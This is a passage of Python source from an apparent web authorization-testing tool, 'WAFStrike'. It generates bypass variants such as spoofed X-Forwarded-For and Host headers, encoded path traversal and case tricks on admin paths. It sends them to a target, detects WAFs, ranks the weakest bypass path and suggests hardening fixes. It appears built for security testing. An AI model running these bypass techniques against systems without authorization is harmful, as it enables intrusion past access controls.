                waf_indicators['header_manipulation_evidence'].append({
                    'headers': list(variant.headers.keys()),
                    'status_code': fingerprint.status_code
                })
        
        # Determine WAF detection result
        if waf_indicators['signatures_found']:
            if waf_indicators['blocking_patterns']:
                return WAFDetectionResult.WAF_BLOCKING
            else:
                return WAFDetectionResult.WAF_DETECTED
        elif waf_indicators['blocking_patterns']:
            return WAFDetectionResult.WAF_BLOCKING
        elif len(waf_indicators['timing_anomalies']) > len(responses) * 0.5:
            return WAFDetectionResult.WAF_PASSIVE
        else:
            return WAFDetectionResult.NO_WAF
    
    def correlate_waf_backend_decisions(self, 
                                     waf_responses: List[Tuple[RequestVariant, ResponseFingerprint]],
                                     backend_responses: List[Tuple[RequestVariant, ResponseFingerprint]]) -> Dict[str, Any]:
        """Correlate WAF vs backend authorization decisions"""
        correlation_analysis = {
            'waf_detections': [],
            'backend_authorization': [],
            'decision_mismatches': [],
            'bypass_opportunities': [],
            'correlation_confidence': 0.0
        }
        
        # Analyze WAF decisions
        for variant, fingerprint in waf_responses:
            waf_decision = self._classify_waf_decision(variant, fingerprint)
            correlation_analysis['waf_detections'].append({
                'variant': variant,
                'fingerprint': fingerprint,
                'decision': waf_decision
            })
        
        # Analyze backend authorization decisions
        for variant, fingerprint in backend_responses:
            auth_decision = self._classify_backend_decision(variant, fingerprint)
            correlation_analysis['backend_authorization'].append({
                'variant': variant,
                'fingerprint': fingerprint,
                'decision': auth_decision
            })
        
        # Find decision mismatches
        correlation_analysis['decision_mismatches'] = self._find_decision_mismatches(
            correlation_analysis['waf_detections'],
            correlation_analysis['backend_authorization']
        )
        
        # Identify bypass opportunities
        correlation_analysis['bypass_opportunities'] = self._identify_bypass_opportunities(
            correlation_analysis['decision_mismatches']
        )
        
        # Calculate correlation confidence
        correlation_analysis['correlation_confidence'] = self._calculate_correlation_confidence(
            correlation_analysis
        )
        
        return correlation_analysis
    
    def _classify_waf_decision(self, variant: RequestVariant, fingerprint: ResponseFingerprint) -> str:
        """Classify WAF decision based on response patterns"""
        content_markers = ' '.join(fingerprint.content_markers).lower()
        
        # Explicit WAF blocks
        if fingerprint.status_code == 403:
            if any(indicator in content_markers for indicator in ['blocked', 'forbidden', 'access denied']):
                return 'waf_block_explicit'
            else:
                return 'waf_block_implicit'
                
        # WAF challenges
        elif fingerprint.status_code == 406:
            return 'waf_challenge'
            
        # Rate limiting
        elif fingerprint.status_code == 429:
            return 'waf_rate_limit'
            
        # Allowed by WAF
        elif fingerprint.status_code in [200, 201, 202]:
            return 'waf_allow'
            
        # Unknown/other
        else:
            return 'waf_unknown'
    
    def _classify_backend_decision(self, variant: RequestVariant, fingerprint: ResponseFingerprint) -> str:
        """Classify backend authorization decision"""
        content_markers = ' '.join(fingerprint.content_markers).lower()
        
        # Authorization errors
        if fingerprint.status_code in [401, 403]:
            if 'unauthorized' in content_markers or 'authentication' in content_markers:
                return 'backend_auth_required'
            elif 'forbidden' in content_markers or 'access denied' in content_markers:
                return 'backend_access_denied'
            else:
                return 'backend_auth_error_generic'
                
        # Successful authorization
        elif fingerprint.status_code in [200, 201, 202]:
            if any(indicator in content_markers for indicator in ['dashboard', 'admin', 'welcome']):
                return 'backend_auth_success_privileged'
            else:
                return 'backend_auth_success_basic'
                
        # Resource not found (could be auth-related)
        elif fingerprint.status_code == 404:
            return 'backend_resource_not_found'
            
        # Server errors (might indicate auth system issues)
        elif fingerprint.status_code >= 500:
            return 'backend_server_error'
            
        else:
            return 'backend_unknown'
    
    def _find_decision_mismatches(self, 
                               waf_detections: List[Dict[str, Any]],
                               backend_authorization: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Find mismatches between WAF and backend decisions"""
        mismatches = []
        
        # Compare responses by variant type
        for waf_item in waf_detections:
            waf_variant = waf_item['variant']
            waf_decision = waf_item['decision']
            
            # Find corresponding backend response
            for backend_item in backend_authorization:
                backend_variant = backend_item['variant']
                backend_decision = backend_item['decision']
                
                # Check if variants are comparable (same type and similar headers)
                if self._variants_comparable(waf_variant, backend_variant):
                    if self._is_decision_mismatch(waf_decision, backend_decision):
                        mismatches.append({
                            'waf_variant': waf_variant,
                            'backend_variant': backend_variant,
                            'waf_decision': waf_decision,
                            'backend_decision': backend_decision,
                            'mismatch_type': self._classify_mismatch_type(waf_decision, backend_decision)
                        })
        
        return mismatches
    
    def _variants_comparable(self, variant1: RequestVariant, variant2: RequestVariant) -> bool:
        """Check if two variants are comparable for correlation analysis"""
        # Same variant type
        if variant1.variant_type != variant2.variant_type:
            return False
            
        # Similar headers (for identity-based variants)
        if variant1.variant_type == VariantType.IDENTITY:
            common_headers = set(variant1.headers.keys()) & set(variant2.headers.keys())
            return len(common_headers) >= 2  # At least 2 common headers
            
        # Same URL for routing variants
        if variant1.variant_type == VariantType.ROUTING:
            return variant1.url == variant2.url
            
        return True
    
    def _is_decision_mismatch(self, waf_decision: str, backend_decision: str) -> bool:
        """Check if WAF and backend decisions represent a mismatch"""
        # WAF allows but backend denies
        if waf_decision.startswith('waf_allow') and backend_decision.startswith('backend_auth_error'):
            return True
            
        # WAF blocks but backend would allow
        if waf_decision.startswith('waf_block') and backend_decision.startswith('backend_auth_success'):
            return True
            
        # WAF challenges but backend would handle normally
        if waf_decision == 'waf_challenge' and not backend_decision.startswith('backend_auth_error'):
            return True
            
        return False
    
    def _classify_mismatch_type(self, waf_decision: str, backend_decision: str) -> str:
        """Classify the type of mismatch for analysis"""
        if waf_decision.startswith('waf_allow') and backend_decision.startswith('backend_auth_error'):
            return 'waf_permissive_backend_restrictive'
        elif waf_decision.startswith('waf_block') and backend_decision.startswith('backend_auth_success'):
            return 'waf_restrictive_backend_permissive'
        elif waf_decision == 'waf_challenge' and not backend_decision.startswith('backend_auth_error'):
            return 'waf_challenge_unnecessary'
        else:
            return 'unknown_mismatch'
    
    def _identify_bypass_opportunities(self, mismatches: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Identify potential bypass opportunities from decision mismatches"""
        opportunities = []
        
        for mismatch in mismatches:
            mismatch_type = mismatch['mismatch_type']
            
            if mismatch_type == 'waf_permissive_backend_restrictive':
                # WAF allows but backend denies - look for backend bypasses
                opportunities.append({
                    'type': 'backend_authorization_bypass',
                    'description': 'WAF permits request but backend denies - potential backend auth bypass',
                    'variant': mismatch['waf_variant'],
                    'confidence': 0.7,
                    'recommended_action': 'Focus on backend authorization testing'
                })
                
            elif mismatch_type == 'waf_restrictive_backend_permissive':
                # WAF blocks but backend would allow - look for WAF bypasses
                opportunities.append({
                    'type': 'waf_evasion_bypass',
                    'description': 'WAF blocks but backend would allow - potential WAF evasion',
                    'variant': mismatch['waf_variant'],
                    'confidence': 0.8,
                    'recommended_action': 'Focus on WAF evasion techniques'
                })
                
            elif mismatch_type == 'waf_challenge_unnecessary':
                # WAF challenges unnecessarily - could be bypassed
                opportunities.append({
                    'type': 'waf_challenge_bypass',
                    'description': 'WAF challenges unnecessarily - potential challenge bypass',
                    'variant': mismatch['waf_variant'],
                    'confidence': 0.6,
                    'recommended_action': 'Test challenge bypass mechanisms'
                })
        
        return opportunities
    
    def _calculate_correlation_confidence(self, correlation_analysis: Dict[str, Any]) -> float:
        """Calculate confidence in the correlation analysis"""
        factors = []
        
        # Factor 1: Number of mismatches found
        mismatches = correlation_analysis['decision_mismatches']
        if mismatches:
            factors.append(min(len(mismatches) / 10.0, 1.0))  # Cap at 1.0
        else:
            factors.append(0.0)
            
        # Factor 2: Clarity of bypass opportunities
        opportunities = correlation_analysis['bypass_opportunities']
        if opportunities:
            avg_confidence = sum(opp['confidence'] for opp in opportunities) / len(opportunities)
            factors.append(avg_confidence)
        else:
            factors.append(0.0)
            
        # Factor 3: Consistency of patterns
        waf_detections = correlation_analysis['waf_detections']
        backend_auth = correlation_analysis['backend_authorization']
        
        if waf_detections and backend_auth:
            consistency = min(len(waf_detections), len(backend_auth)) / max(len(waf_detections), len(backend_auth))
            factors.append(consistency)
        else:
            factors.append(0.0)
            
        # Return weighted average
        if factors:
            return sum(factors) / len(factors)
        else:
            return 0.0



class RequestVariantEngine:
    """Engine for generating adversarial request variants"""
    
    def __init__(self, base_url: str, safety_controls: SafetyControls):
        self.base_url = base_url
        self.safety = safety_controls
        self.parsed_url = urllib.parse.urlparse(base_url)
        
    def generate_variants(self, selected_variants: Optional[List[VariantType]] = None) -> List[RequestVariant]:
        """Generate request variants altering one authorization dimension at a time"""
        if selected_variants is None:
            selected_variants = list(VariantType)
            
        variants = []
        
        for variant_type in selected_variants:
            if variant_type == VariantType.IDENTITY:
                variants.extend(self._generate_identity_variants())
            elif variant_type == VariantType.ROUTING:
                variants.extend(self._generate_routing_variants())
            elif variant_type == VariantType.PROXY_TRUST:
                variants.extend(self._generate_proxy_trust_variants())
            elif variant_type == VariantType.SCHEME:
                variants.extend(self._generate_scheme_variants())
            elif variant_type == VariantType.PORT:
                variants.extend(self._generate_port_variants())
                
        return variants
    
    def _generate_identity_variants(self) -> List[RequestVariant]:
        """Generate identity manipulation variants for bypass testing"""
        variants = []
        
        # Internal IP ranges that may be trusted
        internal_ips = [
            "127.0.0.1",
            "192.168.1.1", 
            "10.0.0.1",
            "172.16.0.1",
            "localhost",
            "::1"
        ]
        
        # Trusted CDN and proxy IPs
        trusted_ips = [
            "173.245.48.0/20",  # CloudFlare
            "104.16.0.0/12",    # CloudFlare
            "151.101.0.0/16",   # Fastly
            "104.16.0.0/13"     # CloudFlare
        ]
        
        # Client IP header variations with bypass potential
        headers_list = []
        for ip in internal_ips + trusted_ips:
            headers_list.extend([
                {"X-Forwarded-For": ip},
                {"X-Real-IP": ip},
                {"X-Client-IP": ip},
                {"X-Original-IP": ip},
                {"CF-Connecting-IP": ip},
                {"True-Client-IP": ip},
                {"X-Forwarded-For": f"{ip}, 203.0.113.1"},  # Chain with external IP
            ])
        
        # Add specified identity and client attribution headers
        headers_list.extend([
            {"Client-IP": "127.0.0.1"},
            {"Real-Ip": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
        ])
        
        # Add bypass-specific headers (identity group only)
        headers_list.extend([
            {"X-Remote-IP": "127.0.0.1"},  # Less common header
            {"X-Remote-Addr": "127.0.0.1"},
        ])
        
        for headers in headers_list:
            variants.append(RequestVariant(
                variant_type=VariantType.IDENTITY,
                headers=headers,
                url=self.base_url
            ))
            
        return variants
    
    def _generate_routing_variants(self) -> List[RequestVariant]:
        """Generate routing/URL manipulation variants for bypass testing"""
        variants = []
        
        # Path normalization and bypass variations
        path_variants = [
            self.parsed_url.path + "/",  # Trailing slash
            self.parsed_url.path + "//",  # Double slash
            self.parsed_url.path + "/./",  # Current directory
            self.parsed_url.path + "/../",  # Directory traversal
            self.parsed_url.path + "/%2e/",  # Encoded dot
            self.parsed_url.path + "/%2e%2e/",  # Encoded traversal
            self.parsed_url.path.upper(),  # Uppercase
            self.parsed_url.path.lower(),  # Lowercase
            self.parsed_url.path.replace('/', '%2F'),  # Encoded slashes
            self.parsed_url.path.replace('/', '%5C'),  # Backslashes
        ]
        
        # Add case-sensitive bypass variations
        if 'admin' in self.parsed_url.path.lower():
            base_path = self.parsed_url.path
            path_variants.extend([
                base_path.replace('admin', 'Admin'),
                base_path.replace('admin', 'ADMIN'),
                base_path.replace('admin', 'aDmIn'),
            ])
        
        # Add prefix/suffix bypass attempts
        path_variants.extend([
            "/" + self.parsed_url.path.lstrip('/'),  # Ensure leading slash
            self.parsed_url.path.rstrip('/') + "/admin",  # Admin suffix
            "/admin" + self.parsed_url.path,  # Admin prefix
        ])
        
        for path in path_variants:
            new_url = urllib.parse.urlunparse((
                self.parsed_url.scheme,
                self.parsed_url.netloc,
                path,
                self.parsed_url.params,
                self.parsed_url.query,
                self.parsed_url.fragment
            ))
            variants.append(RequestVariant(
                variant_type=VariantType.ROUTING,
                headers={},
                url=new_url
            ))
        
        # Add specified URL and routing reconstruction headers
        routing_headers = [
            {"Base-Url": "127.0.0.1"},
            {"Http-Url": "127.0.0.1"},
            {"Proxy-Host": "127.0.0.1"},
            {"Request-Uri": "127.0.0.1"},
            {"Uri": "127.0.0.1"},
            {"Url": "127.0.0.1"},
            {"Redirect": "127.0.0.1"},
            {"Referer": "127.0.0.1"},
            {"Referrer": "127.0.0.1"},
            {"Refferer": "127.0.0.1"},
        ]
        
        for headers in routing_headers:
            variants.append(RequestVariant(
                variant_type=VariantType.ROUTING,
                headers=headers,
                url=self.base_url
            ))
            
        return variants
    
    def _generate_proxy_trust_variants(self) -> List[RequestVariant]:
        """Generate proxy trust manipulation variants for bypass testing"""
        variants = []
        
        # Trusted internal hostnames
        trusted_hosts = [
            "localhost",
            "admin.internal.com",
            "api.internal.com",
            "trusted-proxy.company.com",
            "loadbalancer.internal",
            "gateway.internal"
        ]
        
        # Proxy header variations for bypass
        headers_list = []
        for host in trusted_hosts:
            headers_list.extend([
                {"X-Forwarded-Host": host},
                {"X-Forwarded-Server": host},
                {"X-Original-Host": host},
                {"X-Host": host},
                {"Host": host},  # Direct host header override
            ])
        
        # Protocol and scheme bypass attempts
        headers_list.extend([
            {"X-Forwarded-Proto": "https"},
            {"X-Forwarded-Scheme": "https"},
            {"X-Forwarded-Ssl": "on"},
            {"X-Forwarded-Port": "443"},
            {"X-Forwarded-Proto": "https", "X-Forwarded-Host": "admin.internal.com"},
            {"X-Forwarded-Scheme": "https", "X-Forwarded-Port": "443"},
        ])
        
        # Add specified forwarding and proxy trust headers
        headers_list.extend([
            {"X-Forward-For": "127.0.0.1"},
            {"X-Forwarded-For-Original": "127.0.0.1"},
            {"X-Forwarded-By": "127.0.0.1"},
            {"X-Forwarded-Host": "127.0.0.1"},
            {"X-Forwarded-Server": "127.0.0.1"},
            {"X-Forwarded": "127.0.0.1"},
            {"X-Forwarded-Port": "443"},
            {"X-Forwarded-Port": "80"},
            {"X-Forwarded-Port": "8080"},
            {"X-Forwarded-Port": "8443"},
            {"X-Forwarded-Scheme": "http"},
            {"X-Forwarded-Scheme": "https"},
        ])
        
        # Complex proxy headers (proxy trust group only)
        headers_list.extend([
            {"Via": "1.1 trusted-proxy.com"},
            {"Via": "1.0 internal-loadbalancer, 1.1 trusted-proxy.com"},
            {"Forwarded": "for=127.0.0.1;host=admin.internal.com;proto=https"},
            {"Forwarded": "for=192.168.1.1;host=localhost;proto=https"},
        ])
        
        for headers in headers_list:
            variants.append(RequestVariant(
                variant_type=VariantType.PROXY_TRUST,
                headers=headers,
                url=self.base_url
            ))
            
        return variants
    
    def _generate_scheme_variants(self) -> List[RequestVariant]:
        """Generate scheme manipulation variants"""
        variants = []
        
        # Scheme variations
        schemes = ["http", "https"]
        
        for scheme in schemes:
            if scheme != self.parsed_url.scheme:
                new_url = urllib.parse.urlunparse((
                    scheme,
                    self.parsed_url.netloc,
                    self.parsed_url.path,
                    self.parsed_url.params,
                    self.parsed_url.query,
                    self.parsed_url.fragment
                ))
                variants.append(RequestVariant(
                    variant_type=VariantType.SCHEME,
                    headers={},
                    url=new_url
                ))
                
        return variants
    
    def _generate_port_variants(self) -> List[RequestVariant]:
        """Generate port manipulation variants"""
        variants = []
        
        # Common port variations
        ports = [4443, 443, 80, 8080, 8443]
        
        for port in ports:
            hostname = self.parsed_url.hostname
            new_netloc = f"{hostname}:{port}"
            
            new_url = urllib.parse.urlunparse((
                self.parsed_url.scheme,
                new_netloc,
                self.parsed_url.path,
                self.parsed_url.params,
                self.parsed_url.query,
                self.parsed_url.fragment
            ))
            variants.append(RequestVariant(
                variant_type=VariantType.PORT,
                headers={},
                url=new_url
            ))
            
        return variants

class BypassValidator:
    """Bypass validation and attribution system"""
    
    def __init__(self, safety_controls: SafetyControls):
        self.safety = safety_controls
        
    def validate_bypass(self, baseline: ResponseFingerprint, variant: ResponseFingerprint, 
                       request_variant: RequestVariant) -> Tuple[BypassStatus, Dict[str, any]]:
        """Validate and classify bypass attempts"""
        bypass_details = {
            'baseline_status': baseline.status_code,
            'variant_status': variant.status_code,
            'status_change': variant.status_code != baseline.status_code,
            'size_difference': variant.response_size - baseline.response_size,
            'content_changes': variant.content_markers - baseline.content_markers,
            'technique_used': request_variant.variant_type.value,
            'headers_used': request_variant.headers,
            'url_used': request_variant.url
        }
        
        # Check for confirmed bypass
        if self.safety.should_halt_on_bypass(variant.status_code, variant.content_markers):
            return BypassStatus.CONFIRMED_BYPASS, bypass_details
            
        # Check for partial bypass
        if self.safety.is_partial_bypass(variant.status_code, baseline.status_code, variant.content_markers):
            return BypassStatus.PARTIAL_BYPASS, bypass_details
            
        # Check for bypass preconditions (interesting behavioral changes)
        if self._has_bypass_preconditions(baseline, variant):
            return BypassStatus.BYPASS_PRECONDITION, bypass_details
            
        return BypassStatus.NO_BYPASS, bypass_details
        
    def _has_bypass_preconditions(self, baseline: ResponseFingerprint, variant: ResponseFingerprint) -> bool:
        """Check if bypass preconditions exist"""
        # Significant response size difference
        size_diff = abs(variant.response_size - baseline.response_size)
        if size_diff > 500:
            return True
            
        # Different redirect behavior
        if baseline.redirect_location != variant.redirect_location:
            return True
            
        # Content marker changes
        if variant.content_markers != baseline.content_markers:
            return True
            
        # Cache behavior differences
        if baseline.cache_headers != variant.cache_headers:
            return True
            
        return False

class DifferentialAnalyzer:
    """Differential analysis for behavioral fingerprinting"""
    
    def __init__(self, safety_controls: SafetyControls):
        self.safety = safety_controls
        self.bypass_validator = BypassValidator(safety_controls)
        
    async def analyze_request(self, session: aiohttp.ClientSession, 
                            variant: RequestVariant) -> ResponseFingerprint:
        """Analyze single request and generate behavioral fingerprint"""
        start_time = time.time()
        
        try:
            async with session.request(
                method=variant.method,
                url=variant.url,
                headers=variant.headers,
                data=variant.body,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as response:
                content = await response.text()
                response_time = (time.time() - start_time) * 1000
                
                # Extract cache headers
                cache_headers = {}
                for header in ['Cache-Control', 'ETag', 'Last-Modified', 'Expires']:
                    if header in response.headers:
                        cache_headers[header] = response.headers[header]
                
                # Enhanced content marker extraction for bypass detection
                content_markers = set()
                content_lower = content.lower()
                
                # Privileged content indicators
                privileged_indicators = [
                    "admin", "dashboard", "management", "console",
                    "config", "settings", "debug", "internal",
                    "privileged", "access granted", "welcome back"
                ]
                
                for indicator in privileged_indicators:
                    if indicator in content_lower:
                        content_markers.add(f"privileged_access_{indicator.replace(' ', '_')}")
                
                # Error indicators
                error_indicators = [
                    "unauthorized", "access denied", "forbidden",
                    "login required", "authentication required"
                ]
                
                for indicator in error_indicators:
                    if indicator in content_lower:
                        content_markers.add(f"auth_error_{indicator.replace(' ', '_')}")
                
                # Success indicators
                success_indicators = [
                    "welcome", "dashboard", "overview", "summary",
                    "successfully", "logged in", "session"
                ]
                
                for indicator in success_indicators:
                    if indicator in content_lower:
                        content_markers.add(f"success_indicator_{indicator.replace(' ', '_')}")
                
                fingerprint = ResponseFingerprint(
                    status_code=response.status,
                    response_size=len(content),
                    redirect_location=response.headers.get('Location'),
                    cache_headers=cache_headers,
                    response_time_ms=response_time,
                    content_markers=content_markers
                )
                
                # Bypass validation check will be done in main analysis loop
                # after baseline is established
                
                return fingerprint
                
        except Exception as e:
            # Return error fingerprint
            return ResponseFingerprint(
                status_code=0,
                response_size=0,
                redirect_location=None,
                cache_headers={},
                response_time_ms=(time.time() - start_time) * 1000,
                content_markers={"request_error"}
            )
    
    def compare_fingerprints(self, baseline: ResponseFingerprint, 
                           variant: ResponseFingerprint) -> Dict[str, any]:
        """Compare fingerprints and detect behavioral drift"""
        differences = {}
        
        # Status code differences
        if baseline.status_code != variant.status_code:
            differences['status_change'] = {
                'baseline': baseline.status_code,
                'variant': variant.status_code,
                'severity': 'high' if variant.status_code < 400 else 'medium'
            }
        
        # Response size differences
        size_diff = abs(baseline.response_size - variant.response_size)
        if size_diff > 100:  # Threshold for significant size difference
            differences['size_change'] = {
                'baseline': baseline.response_size,
                'variant': variant.response_size,
                'difference': size_diff,
                'severity': 'medium' if size_diff > 1000 else 'low'
            }
        
        # Redirect differences
        if baseline.redirect_location != variant.redirect_location:
            differences['redirect_change'] = {
                'baseline': baseline.redirect_location,
                'variant': variant.redirect_location,
                'severity': 'high'
            }
        
        # Content marker differences
        marker_diff = baseline.content_markers.symmetric_difference(variant.content_markers)
        if marker_diff:
            differences['content_markers'] = {
                'added': variant.content_markers - baseline.content_markers,
                'removed': baseline.content_markers - variant.content_markers,
                'severity': 'medium'
            }
        
        # Response time differences
        time_diff = abs(baseline.response_time_ms - variant.response_time_ms)
        if time_diff > 500:  # 500ms threshold
            differences['response_time'] = {
                'baseline_ms': baseline.response_time_ms,
                'variant_ms': variant.response_time_ms,
                'difference_ms': time_diff,
                'severity': 'low'
            }
        
        return differences

class WeakestPathDiscovery:
    """Algorithm for discovering the weakest authorization bypass path"""
    
    def __init__(self):
        self.bypass_success_rates = {}
        self.technique_effectiveness = {}
        
    def analyze_weakest_path(self, findings: List[SecurityFinding]) -> Dict[str, any]:
        """Analyze findings to identify the weakest bypass path"""
        if not findings:
            return {"weakest_path": None, "analysis": "No bypasses detected"}
            
        # Group findings by bypass status and technique
        confirmed_bypasses = [f for f in findings if f.bypass_status == BypassStatus.CONFIRMED_BYPASS]
        partial_bypasses = [f for f in findings if f.bypass_status == BypassStatus.PARTIAL_BYPASS]
        
        # Calculate technique effectiveness
        technique_scores = {}
        for finding in findings:
            technique = finding.bypass_technique
            if technique not in technique_scores:
                technique_scores[technique] = {
                    'total_attempts': 0,
                    'successful_bypasses': 0,
                    'partial_bypasses': 0,
                    'avg_confidence': 0.0
                }
            
            technique_scores[technique]['total_attempts'] += 1
            technique_scores[technique]['avg_confidence'] += finding.confidence
            
            if finding.bypass_status == BypassStatus.CONFIRMED_BYPASS:
                technique_scores[technique]['successful_bypasses'] += 1
            elif finding.bypass_status == BypassStatus.PARTIAL_BYPASS:
                technique_scores[technique]['partial_bypasses'] += 1
        
        # Calculate averages
        for technique in technique_scores:
            if technique_scores[technique]['total_attempts'] > 0:
                technique_scores[technique]['avg_confidence'] /= technique_scores[technique]['total_attempts']
        
        # Find weakest path (highest success rate)
        weakest_technique = None
        highest_success_rate = 0.0
        
        for technique, scores in technique_scores.items():
            total = scores['total_attempts']
            if total > 0:
                success_rate = (scores['successful_bypasses'] + scores['partial_bypasses'] * 0.5) / total
                if success_rate > highest_success_rate:
                    highest_success_rate = success_rate
                    weakest_technique = technique
        
        return {
            "weakest_technique": weakest_technique,
            "success_rate": highest_success_rate,
            "technique_analysis": technique_scores,
            "confirmed_bypasses": len(confirmed_bypasses),
            "partial_bypasses": len(partial_bypasses),
            "total_findings": len(findings)
        }

class HardeningRecommendationEngine:
    """Generate concrete hardening recommendations based on bypass findings"""
    
    def generate_recommendations(self, finding: SecurityFinding) -> List[str]:
        """Generate specific hardening recommendations for each bypass type"""
        recommendations = []
        
        if finding.bypass_status == BypassStatus.CONFIRMED_BYPASS:
            recommendations.append("IMMEDIATE ACTION REQUIRED: Confirmed authorization bypass detected")
        
        # Technique-specific recommendations
        if finding.bypass_technique == "identity":
            recommendations.extend([
                "Implement strict IP validation - never trust client-controlled IP headers",
                "Remove or sanitize X-Forwarded-For, X-Real-IP, and similar headers at edge",
                "Use connection-level IP addresses for authorization decisions",
                "Implement IP allowlisting at the network level",
                "Add request signing or mutual TLS for internal services"
            ])
            
        elif finding.bypass_technique == "proxy_trust":
            recommendations.extend([
                "Validate all proxy headers against trusted proxy IP ranges",
                "Implement allowlist of trusted proxy IPs and hostnames",
                "Remove or sanitize X-Forwarded-* headers at network edge",
                "Use internal service mesh with mTLS for trusted communications",
                "Implement request fingerprinting to detect header manipulation"
            ])
            
        elif finding.bypass_technique == "routing":
            recommendations.extend([
                "Implement consistent URL normalization across all infrastructure components",
                "Use canonical URL paths and redirect variations to standard form",
                "Implement path validation and sanitization at application level",
                "Use web application firewall rules for path traversal prevention",
                "Implement strict routing rules at load balancer/reverse proxy level"
            ])
            
        elif finding.bypass_technique == "scheme":
            recommendations.extend([
                "Enforce HTTPS-only access with HSTS headers",
                "Implement strict port-based access controls",
                "Use separate internal services for different protocol schemes",
                "Implement protocol validation at application layer",
                "Terminate SSL/TLS at trusted edge components only"
            ])
            
        elif finding.bypass_technique == "port":
            recommendations.extend([
                "Implement port-based access controls at firewall level",
                "Use standard ports only for external access",
                "Implement port knocking or similar access mechanisms",
                "Separate internal and external services by port",
                "Monitor and alert on non-standard port access attempts"
            ])
        
        # General hardening recommendations
        recommendations.extend([
            "Implement defense-in-depth with multiple authorization layers",
            "Add comprehensive logging and monitoring for authorization failures",
            "Implement rate limiting and anomaly detection",
            "Regular security testing and authorization audit procedures",
            "Document and enforce trust boundaries across infrastructure"
        ])
        
        return recommendations

class WAFStrike:
    """Main WAFStrike v2.0.0 research-grade authorization testing framework"""
    
    def __init__(self, target_url: str, config_file: Optional[str] = None):
        self.target_url = target_url
        self.safety = SafetyControls()
        self.variant_engine = RequestVariantEngine(target_url, self.safety)
        self.analyzer = DifferentialAnalyzer(self.safety)
        self.weakest_path_analyzer = WeakestPathDiscovery()
        self.hardening_engine = HardeningRecommendationEngine()
        
        # v2.0.0 Core Components
        self.auth_validator = AuthorizationValidator(self.safety)
        self.identity_tester = IdentityContextTester(self.safety)
        self.adaptive_engine = AdaptiveRequestEngine(self.safety)
        self.waf_correlation = WAFBackendCorrelation(self.safety)
        
        self.findings: List[SecurityFinding] = []
        self.request_count = 0
        self.bypass_confirmed = False
        
        # v2.0.0 State tracking
        self.authorization_state_history: List[Dict[str, Any]] = []
        self.adaptive_learning_history: List[Dict[str, Any]] = []
        self.correlation_results: Dict[str, Any] = {}
        
    async def run_analysis(self, selected_variants: Optional[List[VariantType]] = None,
                          verbosity: int = 1) -> None:
        """Run complete research-grade authorization testing analysis"""
        safe_print(f"{Fore.CYAN}[WAFStrike v2.0.0] Starting research-grade authorization analysis{Style.RESET_ALL}")
        safe_print(f"{Fore.CYAN}[TARGET] {self.target_url}{Style.RESET_ALL}")
        
        # Phase 1: Identity Context Divergence Testing
        if verbosity >= 2:
            safe_print(f"{Fore.BLUE}[PHASE 1] Identity Context Divergence Testing{Style.RESET_ALL}")
        
        base_identity_context = IdentityContext(
            user_id="anonymous",
            role="guest",
            permissions=set(),
            ip_address="203.0.113.1",
            confidence=0.8
        )
        
        identity_contexts = self.identity_tester.create_identity_contexts(self.target_url)
        divergence_results = self.identity_tester.test_identity_divergence(
            base_identity_context, identity_contexts, self.target_url
        )
        
        # Phase 2: WAF Detection and Correlation
        if verbosity >= 2:
            safe_print(f"{Fore.BLUE}[PHASE 2] WAF Detection and Backend Correlation{Style.RESET_ALL}")
        
        # Generate initial variants for WAF detection
        initial_variants = self.variant_engine.generate_variants(selected_variants)
        
        async with aiohttp.ClientSession() as session:
            # Test WAF presence
            waf_responses = []
            for variant in initial_variants[:10]:  # Test subset for WAF detection
                if not self.safety.check_request_limit(self.request_count):
                    break
                    
                self.safety.check_rate_limit()
                self.request_count += 1
                
                fingerprint = await self.analyzer.analyze_request(session, variant)
                waf_responses.append((variant, fingerprint))
            
            # Detect WAF presence
            waf_detection = self.waf_correlation.detect_waf_presence(waf_responses)
            safe_print(f"{Fore.YELLOW}[WAF] Detection result: {waf_detection.value}{Style.RESET_ALL}")
            
            # Phase 3: Adaptive Request Generation
            if verbosity >= 2:
                safe_print(f"{Fore.BLUE}[PHASE 3] Adaptive Request Strategy Development{Style.RESET_ALL}")
            
            # Analyze target behavior and adapt
            behavior_analysis = self.adaptive_engine.analyze_target_behavior(waf_responses)
            adaptations = behavior_analysis.get('adaptation_recommendations', [])
            
            if adaptations:
                safe_print(f"{Fore.GREEN}[ADAPTIVE] Generated {len(adaptations)} adaptation strategies{Style.RESET_ALL}")
                for adaptation in adaptations:
                    if verbosity >= 3:
                        safe_print(f"  - {adaptation['description']}{Style.RESET_ALL}")
            
            # Apply adaptations to variants
            adapted_variants = self.adaptive_engine.adapt_variants(initial_variants, adaptations)
            
            # Add identity divergence variants
            if divergence_results['divergence_detected']:
                for pattern in divergence_results['divergence_patterns']:
                    divergence_variants = self.identity_tester.generate_divergence_variants(
                        base_identity_context, pattern
                    )
                    for variant in divergence_variants:
                        variant.url = self.target_url
                    adapted_variants.extend(divergence_variants)
            
            # Phase 4: Comprehensive Authorization Testing
            if verbosity >= 2:
                safe_print(f"{Fore.BLUE}[PHASE 4] Comprehensive Authorization Validation{Style.RESET_ALL}")
            
            # Create baseline authorization context
            baseline_variant = RequestVariant(
                variant_type=VariantType.IDENTITY,
                headers={},
                url=self.target_url
            )
            
            baseline_fingerprint = await self.analyzer.analyze_request(session, baseline_variant)
            baseline_auth_context = AuthorizationContext(
                endpoint=self.target_url,
                method="GET",
                identity_context=base_identity_context,
                waf_detected=waf_detection
            )
            
            # Test adapted variants with authorization validation
            all_responses = [(baseline_variant, baseline_fingerprint)]
            validation_results = []
            cross_checks = {}
            
            for i, variant in enumerate(adapted_variants):
                if not self.safety.check_request_limit(self.request_count):
                    safe_print(f"{Fore.RED}[SAFETY] Request limit reached{Style.RESET_ALL}")
                    break
                
                self.safety.check_rate_limit()
                self.request_count += 1
                
                if verbosity >= 2:
                    safe_print(f"{Fore.BLUE}[TESTING] Variant {i+1}/{len(adapted_variants)} "
                          f"({variant.variant_type.value}){Style.RESET_ALL}")
                
                variant_fingerprint = await self.analyzer.analyze_request(session, variant)
                all_responses.append((variant, variant_fingerprint))
                
                # Create authorization context for this variant
                auth_context = AuthorizationContext(
                    endpoint=self.target_url,
                    method=variant.method,
                    identity_context=self._extract_identity_from_variant(variant),
                    waf_detected=waf_detection
                )
                
                # Validate authorization state
                auth_state, validation_level = self.auth_validator.validate_authorization_state(
                    baseline_fingerprint, variant_fingerprint, auth_context
                )
                
